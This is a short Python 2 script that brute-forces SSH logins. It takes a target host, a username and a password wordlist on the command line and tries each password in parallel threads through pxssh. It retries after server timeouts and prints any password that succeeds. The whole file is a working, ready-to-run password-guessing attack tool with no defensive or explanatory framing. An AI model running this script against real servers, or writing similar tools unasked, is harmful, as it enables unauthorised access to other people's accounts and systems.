import pxssh
import optparse
import time
from threading import *

#Global variables
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
found = False
fails = 0

def connect(host, user, password, release):
	global found
	global fails
	
	try:
		s = pxssh.pxssh() #create pxssh object
		s.login(host,user,password) #attempt login to ssh server
		print '[+] Password found: ' +password #print if the correct password is found
		found = True #will release the connection since the pw was found
	except Exception, e:
		if 'read_nonblocking' in str(e): #ssh server maxed out on connection attemtps
			fails += 1
			time.sleep(5) #wait five seconds
			connect(host,user,password, False)
		elif 'synchronize with original prompt' in str(e): #unable to get command prompt, waiting a second for prompt
			time.sleep(1) #wait 1 second
			connect(host,user,password, False)
	finally:
		if release: connection_lock.release() #release connection when password is found

def main():
	
	parser = optparse.OptionParser('usage%prog -H <target host> -u <username> -F <password list>')
	#define the parse options
	parser.add_option('-H', dest='tgtHost', type='string', help = 'specify target host')
	parser.add_option('-u', dest='user', type='string', help = 'specify the username')
	parser.add_option('-F', dest='pwFile', type='string', help = 'specify the password file')
	(options, args) = parser.parse_args()

	host = options.tgtHost
	pwFile = options.pwFile
	user = options.user

	if (host == None) | (pwFile == None) | (user == None): #check if any of the options were not entered
		print parser.usage
		exit(0)

	fn = open(pwFile, 'r') #open the password file
	for line in fn.readlines(): #go through file line by line
		if found: #checking if the password was found in connect()
			print '[*] Exiting: Password Found'
			exit(0)

		if fails > 5:
			print "[!] Exiting: Too Many Socket Timeouts"
			exit(0)

		connection_lock.acquire()
		password = line.strip('\r').strip('\n')
		print '[-] Testing: ' + str(password)
		t = Thread(target = connect, args = (host,user,password,True)) #create thread to start connections
		child = t.start() #start the thread

if __name__ == '__main__':
	main()
